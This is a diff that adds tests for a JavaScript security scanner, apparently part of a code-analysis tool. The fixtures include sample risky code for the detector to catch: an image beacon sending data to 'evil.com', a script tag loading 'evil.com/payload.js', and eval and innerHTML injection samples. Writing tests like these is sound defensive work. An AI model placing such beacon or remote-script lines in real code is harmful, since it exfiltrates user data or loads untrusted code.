@@ -1,4 +1,4 @@
-"""Phase 2 tests: Static analysis — Python AST + JS regex scanners."""
+"""Phase 2 tests: Static analysis — Python AST + JS AST/regex scanners."""
 
 from pathlib import Path
 
@@ -146,3 +146,119 @@ class TestJSScanner:
         findings = scan_js_repo(repo)
         assert any("comp.ts" in f.file for f in findings)
         assert not any("readme.txt" in f.file for f in findings)
+
+
+class TestJSScannerAST:
+    """Tests specific to AST-based JS analysis."""
+
+    def test_no_false_positive_in_comments(self, tmp_path):
+        """eval in a comment should NOT trigger a finding via AST."""
+        f = tmp_path / "commented.js"
+        f.write_text(
+            '// eval("this is just a comment")\n'
+            'var x = 1;\n'
+        )
+        findings = scan_js_file(f)
+        assert not any(f.category == "code_injection" for f in findings)
+
+    def test_no_false_positive_in_strings(self, tmp_path):
+        """The word 'eval' inside a string literal should NOT trigger."""
+        f = tmp_path / "stringy.js"
+        f.write_text(
+            'var msg = "do not use eval in production";\n'
+            'console.log(msg);\n'
+        )
+        findings = scan_js_file(f)
+        assert not any(f.category == "code_injection" for f in findings)
+
+    def test_settimeout_string_arg_detected(self, tmp_path):
+        """setTimeout with a string argument acts as eval — should be HIGH."""
+        f = tmp_path / "timer.js"
+        f.write_text('setTimeout("alert(1)", 1000);\n')
+        findings = scan_js_file(f)
+        assert any(
+            f.category == "code_injection" and f.severity == Severity.HIGH
+            for f in findings
+        )
+
+    def test_settimeout_function_arg_clean(self, tmp_path):
+        """setTimeout with a function argument is safe."""
+        f = tmp_path / "timer_ok.js"
+        f.write_text('setTimeout(function() { console.log(1); }, 1000);\n')
+        findings = scan_js_file(f)
+        assert not any(f.category == "code_injection" for f in findings)
+
+    def test_new_image_detected(self, tmp_path):
+        """new Image() — potential exfiltration vector."""
+        f = tmp_path / "img.js"
+        f.write_text('var img = new Image();\nimg.src = "https://evil.com/track?d=" + data;\n')
+        findings = scan_js_file(f)
+        assert any(f.category == "data_exfiltration" for f in findings)
+
+    def test_innerhtml_assignment(self, tmp_path):
+        """x.innerHTML = ... should be detected via AST AssignmentExpression."""
+        f = tmp_path / "xss.js"
+        f.write_text('document.getElementById("app").innerHTML = userInput;\n')
+        findings = scan_js_file(f)
+        assert any(f.category == "xss" for f in findings)
+
+    def test_document_createelement_script(self, tmp_path):
+        """document.createElement('script') should be HIGH."""
+        f = tmp_path / "script_inject.js"
+        f.write_text('var s = document.createElement("script");\n')
+        findings = scan_js_file(f)
+        assert any(
+            f.category == "script_injection" and f.severity == Severity.HIGH
+            for f in findings
+        )
+
+    def test_document_createelement_div_lower(self, tmp_path):
+        """document.createElement('div') should be MEDIUM, not HIGH."""
+        f = tmp_path / "div_create.js"
+        f.write_text('var d = document.createElement("div");\n')
+        findings = scan_js_file(f)
+        high_script = [f for f in findings
+                       if f.category == "script_injection" and f.severity == Severity.HIGH]
+        assert len(high_script) == 0
+
+    def test_fetch_info_level(self, tmp_path):
+        """fetch() should be INFO, not a high severity."""
+        f = tmp_path / "net.js"
+        f.write_text('fetch("/api/data").then(function(r) { return r.json(); });\n')
+        findings = scan_js_file(f)
+        assert any(f.category == "network" and f.severity == Severity.INFO for f in findings)
+
+    def test_localstorage_detected(self, tmp_path):
+        f = tmp_path / "storage.js"
+        f.write_text('localStorage.setItem("key", "value");\n')
+        findings = scan_js_file(f)
+        assert any(f.category == "data_access" for f in findings)
+
+    def test_regex_fallback_on_es2020(self, tmp_path):
+        """Files with ES2020+ syntax (optional chaining) should fall back to regex."""
+        f = tmp_path / "modern.js"
+        f.write_text(
+            'const val = obj?.nested?.prop;\n'
+            'eval("bad");\n'
+        )
+        findings = scan_js_file(f)
+        # Should still detect eval via regex fallback
+        assert any(f.category == "code_injection" for f in findings)
+        # Should have parse_info noting fallback
+        assert any(f.category == "parse_info" for f in findings)
+
+    def test_src_external_url_detected(self, tmp_path):
+        """.src = 'https://...' assignment should flag script_injection."""
+        f = tmp_path / "ext.js"
+        f.write_text('var s = document.createElement("script");\ns.src = "https://evil.com/payload.js";\n')
+        findings = scan_js_file(f)
+        assert any(f.category == "script_injection" for f in findings)
+
+    def test_line_numbers_present(self, tmp_path):
+        """AST findings should include correct line numbers."""
+        f = tmp_path / "lines.js"
+        f.write_text('var x = 1;\nvar y = 2;\neval("bad");\n')
+        findings = scan_js_file(f)
+        eval_findings = [f for f in findings if f.category == "code_injection"]
+        assert len(eval_findings) > 0
+        assert eval_findings[0].line == 3
